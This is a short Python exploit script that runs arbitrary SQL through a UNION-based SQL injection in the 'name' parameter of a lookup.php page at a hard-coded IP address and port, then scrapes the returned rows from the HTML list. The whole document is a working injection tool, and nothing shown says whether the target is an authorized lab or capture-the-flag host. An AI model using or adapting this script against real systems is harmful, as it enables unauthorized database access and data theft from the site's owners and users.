#!/usr/bin/env python3
"""Run arbitrary SQL through the UNION injection and print returned rows."""
import sys, requests, re
T = "http://54.72.82.22:8140/lookup.php"

def sqli(sql):
    name = "zz' UNION SELECT " + sql + "-- "
    r = requests.get(T, params={"name": name}, timeout=30)
    if r.status_code != 200:
        return f"<HTTP {r.status_code}: {r.text.strip()}>"
    body = r.text
    m = re.search(r"<ul>(.*?)</ul>", body, re.S)
    if not m:
        return "<no ul>"
    return re.findall(r"<li>(.*?)</li>", m.group(1), re.S)

if __name__ == "__main__":
    sql = sys.argv[1]
    for row in sqli(sql):
        print(row)
